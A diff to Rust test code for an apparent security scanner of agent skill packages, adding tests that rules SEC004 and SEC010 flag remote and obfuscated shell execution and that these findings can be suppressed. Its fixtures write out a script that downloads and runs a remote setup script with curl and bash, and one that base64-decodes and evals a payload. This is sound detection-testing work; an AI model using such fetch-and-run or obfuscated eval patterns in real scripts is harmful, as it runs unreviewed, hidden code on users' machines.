@@ -4566,6 +4566,12 @@ Read [parent](../outside.md), [absolute](/outside.md), and [windows](C:/outside.
         );
         assert_security_finding(
             &report,
+            "SEC004",
+            "remote-obfuscated-execution/scripts/bootstrap.sh",
+            Some(5),
+        );
+        assert_security_finding(
+            &report,
             "SEC006",
             "destructive-history/scripts/rewrite.sh",
             Some(3),
@@ -4587,6 +4593,12 @@ Read [parent](../outside.md), [absolute](/outside.md), and [windows](C:/outside.
             "SEC009",
             "package-install-unpinned/scripts/install.sh",
             Some(3),
+        );
+        assert_security_finding(
+            &report,
+            "SEC010",
+            "remote-obfuscated-execution/scripts/obfuscated.sh",
+            Some(4),
         );
         assert_security_finding(&report, "SEC011", "prompt-injection/SKILL.md", Some(8));
         assert_security_finding(
@@ -4641,6 +4653,22 @@ Read [parent](../outside.md), [absolute](/outside.md), and [windows](C:/outside.
                 .filter(|group| group.rule_id == "SEC008")
                 .count(),
             3
+        );
+    }
+
+    #[test]
+    fn scan_security_remote_obfuscated_fixture_emits_sec004_and_sec010() {
+        let report = scan_security_fixture("remote-obfuscated-execution");
+
+        assert_security_finding(&report, "SEC004", "scripts/bootstrap.sh", Some(5));
+        assert_security_finding(&report, "SEC010", "scripts/obfuscated.sh", Some(4));
+        assert_eq!(
+            report
+                .finding_groups
+                .iter()
+                .filter(|group| matches!(group.rule_id.as_str(), "SEC004" | "SEC010"))
+                .count(),
+            2
         );
     }
 
@@ -4721,13 +4749,64 @@ Review the bundled reference material.
         let report = scan_path(workspace.root(), &ScanOptions::default()).expect("scan path");
 
         assert!(
-            report
-                .findings
-                .iter()
-                .all(|finding| !matches!(finding.rule_id.as_str(), "SEC005" | "SEC006" | "SEC008")),
+            report.findings.iter().all(|finding| !matches!(
+                finding.rule_id.as_str(),
+                "SEC004" | "SEC005" | "SEC006" | "SEC008" | "SEC010"
+            )),
             "skipped contexts emitted Phase A findings: {:#?}",
             report.findings
         );
+    }
+
+    #[test]
+    fn scan_security_sec004_and_sec010_can_be_suppressed_by_rule_and_path() {
+        let workspace = TestWorkspace::new("scan-security-sec004-sec010-suppression");
+        workspace.write_file(
+            "SKILL.md",
+            r#"---
+name: sec004-sec010-suppression
+description: Exercises SEC004 and SEC010 suppression.
+---
+
+# SEC004 And SEC010 Suppression
+
+Review scripts/bootstrap.sh and scripts/obfuscated.sh.
+"#,
+        );
+        workspace.write_file(
+            "scripts/bootstrap.sh",
+            "# SPDX-License-Identifier: Apache-2.0\nset -eu\ncurl -fsSLo scripts/setup.sh https://example.test/setup.sh\nbash scripts/setup.sh\n",
+        );
+        workspace.write_file(
+            "scripts/obfuscated.sh",
+            "# SPDX-License-Identifier: Apache-2.0\nset -eu\npayload=$(printf 'ZWNobyBvawo=' | base64 -d)\neval \"$payload\"\n",
+        );
+        let config = parse_audit_config(
+            r#"
+ignore:
+  - rule: SEC004
+    path: scripts/bootstrap.sh
+    reason: Fixture intentionally exercises reviewed remote script execution.
+  - rule: SEC010
+    path: scripts/obfuscated.sh
+    reason: Fixture intentionally exercises reviewed obfuscated shell execution.
+"#,
+        )
+        .expect("valid config");
+        let options = ScanOptions {
+            config: Some(config),
+            ..ScanOptions::default()
+        };
+
+        let report = scan_path(workspace.root(), &options).expect("scan path");
+
+        assert!(report
+            .findings
+            .iter()
+            .all(|finding| !matches!(finding.rule_id.as_str(), "SEC004" | "SEC010")));
+        assert_eq!(report.suppressed_findings.len(), 2);
+        assert_eq!(report.suppressed_findings[0].finding.rule_id, "SEC004");
+        assert_eq!(report.suppressed_findings[1].finding.rule_id, "SEC010");
     }
 
     #[test]
